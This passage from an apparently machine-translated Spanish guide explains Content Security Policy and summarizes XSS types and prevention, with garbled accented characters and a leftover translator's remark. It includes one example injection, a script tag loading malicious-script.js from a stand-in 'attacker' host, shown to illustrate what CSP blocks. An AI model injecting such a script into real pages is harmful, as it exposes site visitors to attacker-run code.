- **Noeval:** La funci√≥n JavaScript evalno se puede utilizar.

- **CSP en acci√≥n:** En el siguiente ejemplo, un atacante logr√≥ inyectar c√≥digo malicioso en una p√°gina: 

```html
<html>

Latest comment:

<script src="http://attacker/malicious-script.js"></script>

</html>
```

Con una pol√≠tica CSP correctamente definida, el navegador no se cargar√≠a ni ejecutar√≠a malicious‚Äëscript.jsporque [http://attacker/no](http://attacker/no) estar√≠a en el conjunto de fuentes confiables. Aunque en este caso el sitio web no pudo manejar de forma segura la entrada del usuario, la pol√≠tica del CSP evit√≥ que la vulnerabilidad causara alg√∫n da√±o.

Incluso si el atacante hubiera inyectado el c√≥digo del script en l√≠nea en lugar de vincularlo a un archivo externo, una pol√≠tica de CSP correctamente definida que no permitiera JavaScript en l√≠nea tambi√©n habr√≠a evitado que la vulnerabilidad causara alg√∫n da√±o.

### ¬øC√≥mo habilitar CSP?

De forma predeterminada, los navegadores no aplican CSP. Para habilitar CSP en su sitio web, las p√°ginas deben tener un encabezado HTTP adicional: Content‚ÄëSecurity‚ÄëPolicy. Cualquier p√°gina enviada con este encabezado tendr√° su pol√≠tica de seguridad respetada por el navegador que la cargue, siempre que el navegador admita CSP.

Dado que la pol√≠tica de seguridad se env√≠a con cada respuesta HTTP, es posible que un servidor establezca su pol√≠tica p√°gina por p√°gina. Se puede aplicar la misma pol√≠tica a un sitio web completo proporcionando el mismo encabezado CSP en cada respuesta.

El valor del Content‚ÄëSecurity‚ÄëPolicyencabezado es una cadena que define una o m√°s pol√≠ticas de seguridad que entrar√°n en vigor en su sitio web. La sintaxis de esta cadena se describir√° a continuaci√≥n.

*Los encabezados de ejemplo en esta secci√≥n utilizan nuevas l√≠neas y sangr√≠a para mayor claridad; esto no deber√≠a estar presente en un encabezado real.*

### Sintaxis de CSP

La sintaxis de un encabezado CSP es la siguiente:

> Content‚ÄëSecurity‚ÄëPolicy:
>  
> *directive* *source‚Äëexpression*, *source‚Äëexpression*, ...;
> 
> *directive* ...;
> 
> ...


Esta sintaxis se compone de dos elementos:

- **Las directivas** son cadenas que especifican un tipo de recurso, tomadas de una lista predefinida.
- **Las expresiones de origen** son patrones que describen uno o m√°s servidores desde donde se pueden descargar recursos.

Para cada directiva, las expresiones fuente dadas definen qu√© fuentes se pueden usar para descargar recursos del tipo respectivo.

### Directivas

Las directivas que se pueden utilizar en un encabezado CSP son las siguientes:

- connect‚Äësrc
- font‚Äësrc
- frame‚Äësrc
- img‚Äësrc
- media‚Äësrc
- object‚Äësrc
- script‚Äësrc
- style‚Äësrc

Adem√°s de estas, la directiva especial default‚Äësrcse puede utilizar para proporcionar un valor predeterminado para todas las directivas que no se han incluido en el encabezado.

**Expresiones fuente**

La sintaxis de una expresi√≥n fuente es la siguiente:

> protocol://host‚Äëname:port‚Äënumber

El nombre de host puede comenzar con *., lo que significa que se permitir√° cualquier subdominio del nombre de host proporcionado. De manera similar, el n√∫mero de puerto puede ser *, lo que significa que se permitir√°n todos los puertos. Adem√°s, se pueden omitir el protocolo y el n√∫mero de puerto. Finalmente, se puede dar un protocolo propio, lo que permite exigir que todos los recursos se carguen mediante HTTPS.

Adem√°s de la sintaxis anterior, una expresi√≥n fuente puede ser alternativamente una de cuatro palabras clave con significado especial (comillas incluidas):

Aqu√≠ tienes el texto traducido y con el formato mejorado en Markdown:


- **'none'** 
  No permite recursos.

- **'self'**  
  Permite recursos del host que sirvi√≥ la p√°gina.

- **'unsafe-inline'**  
  Permite recursos incrustados en la p√°gina, como elementos `<script>` en l√≠nea, elementos `<style>` y `javascript:URL`.

- **'unsafe-eval'**  
  Permite el uso de la funci√≥n `eval` de JavaScript.

Tenga en cuenta que siempre que se utiliza CSP, los recursos en l√≠nea y evalno se permiten autom√°ticamente de forma predeterminada. Usar 'unsafe‚Äëinline'y 'unsafe‚Äëeval'es la √∫nica forma de permitirlos.

**Una pol√≠tica de ejemplo**

> Content‚ÄëSecurity‚ÄëPolicy:
> 
> 
> script‚Äësrc 'self' scripts.example.com;
> 
> media‚Äësrc 'none';
> 
> img‚Äësrc *;
> 
> default‚Äësrc 'self' [http://*.example.com](about:blank)


En esta pol√≠tica de ejemplo, la p√°gina est√° sujeta a las siguientes restricciones:

- Los scripts s√≥lo se pueden descargar desde el host que sirve la p√°gina y desde scripts.example.com.
- Los archivos de audio y video no se pueden descargar desde ning√∫n lugar.
- Los archivos de imagen se pueden descargar desde cualquier host.
- Todos los dem√°s recursos se pueden descargar √∫nicamente desde el host que sirve la p√°gina y desde cualquier subdominio de example.com.

### Estado del PSIC

A partir de junio de 2013, la Pol√≠tica de seguridad de contenidos es [una recomendaci√≥n candidata del W3C](http://www.w3.org/TR/CSP/) . Lo est√°n implementando los proveedores de navegadores, pero algunas partes todav√≠a son espec√≠ficas del navegador. En particular, el encabezado HTTP a utilizar puede diferir entre navegadores. Antes de utilizar CSP hoy, consulte la documentaci√≥n de los navegadores que desea admitir.

## Resumen

Resumen: descripci√≥n general de XSS

- XSS es un ataque de inyecci√≥n de c√≥digo posible gracias al manejo inseguro de la entrada del usuario.
- Un ataque XSS exitoso permite a un atacante ejecutar JavaScript malicioso en el navegador de la v√≠ctima.
- Un ataque XSS exitoso compromete la seguridad tanto del sitio web como de sus usuarios.

**Resumen: ataques XSS**

- Hay tres tipos principales de ataques XSS:
- XSS persistente, donde la entrada maliciosa se origina en la base de datos del sitio web.
- XSS reflejado, donde la entrada maliciosa se origina a partir de la solicitud de la v√≠ctima.
- XSS basado en DOM, donde la vulnerabilidad est√° en el c√≥digo del lado del cliente en lugar del c√≥digo del lado del servidor.
- Todos estos ataques se realizan de diferentes maneras pero tienen el mismo efecto si tienen √©xito.

**Resumen: Prevenci√≥n de XSS**

- La forma m√°s importante de prevenir ataques XSS es realizar un manejo de entrada seguro.
- La mayor√≠a de las veces, la codificaci√≥n debe realizarse siempre que se incluyan entradas del usuario en una p√°gina.
- En algunos casos, la codificaci√≥n debe ser reemplazada o complementada con validaci√≥n.
- El manejo seguro de la entrada debe tener en cuenta en qu√© contexto de una p√°gina se inserta la entrada del usuario.
- Para evitar todo tipo de ataques XSS, se debe realizar un manejo seguro de la entrada tanto en el c√≥digo del lado del cliente como del del servidor.
- La pol√≠tica de seguridad de contenido proporciona una capa adicional de defensa para cuando falla el manejo seguro de la entrada.

### Conclusi√≥n

Cabe se√±alar que existe una superposici√≥n en la terminolog√≠a utilizada actualmente para describir XSS: un ataque XSS basado en DOM tambi√©n es persistente o reflejado al mismo tiempo; No es un tipo de ataque separado. No existe una terminolog√≠a ampliamente aceptada que cubra todos los tipos de XSS sin superposici√≥n. Sin embargo, independientemente de la terminolog√≠a utilizada para describir XSS, lo m√°s importante a identificar sobre cualquier ataque es de d√≥nde proviene la entrada maliciosa y d√≥nde se encuentra la vulnerabilidad.

Si sigue las pautas b√°sicas de esta p√°gina, podr√° evitar las vulnerabilidades m√°s comunes que se introducen en el c√≥digo. En general, dedicar tiempo a la validaci√≥n de entradas y la desinfecci√≥n y escape de salidas har√° que su aplicaci√≥n sea segura.

Al elegir funciones para desinfecci√≥n y escape, elija la funci√≥n que m√°s se acerque a su caso de uso espec√≠fico. Si est√° enviando datos a un atributo HTML, utilice una funci√≥n de desinfecci√≥n o escape espec√≠fica para los atributos HTML. Esto le brindar√° la mejor combinaci√≥n de rendimiento y seguridad de la aplicaci√≥n.

Si puede evitar las vulnerabilidades XSS y proteger la salida de su aplicaci√≥n, evitar√° casi la mitad de todas las vulnerabilidades que podr√≠an introducirse en su aplicaci√≥n.

**REFERENCIAS**

- [Documentaci√≥n filter_var() de PHP.](http://php.net/manual/en/function.filter-var.php)
- [Filtros de validaci√≥n de PHP.](http://php.net/manual/en/filter.filters.validate.php)
- [Filtros de sanitizaci√≥n de PHP.](http://php.net/manual/en/filter.filters.sanitize.php)
- [Funciones de WordPress para desinfecci√≥n y escape (art√≠culo sobre Validaci√≥n de datos).](https://codex.wordpress.org/Data_Validation)
- [Otro art√≠culo de WordPress sobre validaci√≥n, desinfecci√≥n y escape de datos de usuario.](https://codex.wordpress.org/Validating_Sanitizing_and_Escaping_User_Data)
- [Art√≠culo de OWASP sobre XSS.](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))
- [Hoja de referencia de OWASP XSS.](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
- [Art√≠culo de seguridad de aplicaciones de Google sobre XSS.](https://www.google.com/about/appsecurity/learning/xss/)
- [https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS).html](https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS).html)
- [https://cwe.mitre.org/data/definitions/79.html](https://cwe.mitre.org/data/definitions/79.html)
- [http://projects.webappsec.org/Cross-Site-Scripting](http://projects.webappsec.org/Cross-Site-Scripting)
- [https://owasp.org/Top10/A03_2021-Injection/](https://owasp.org/Top10/A03_2021-Injection/)
- [https://owasp.org/www-project-web-security-testing-guide](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting)
- [https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS).html](https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS).html)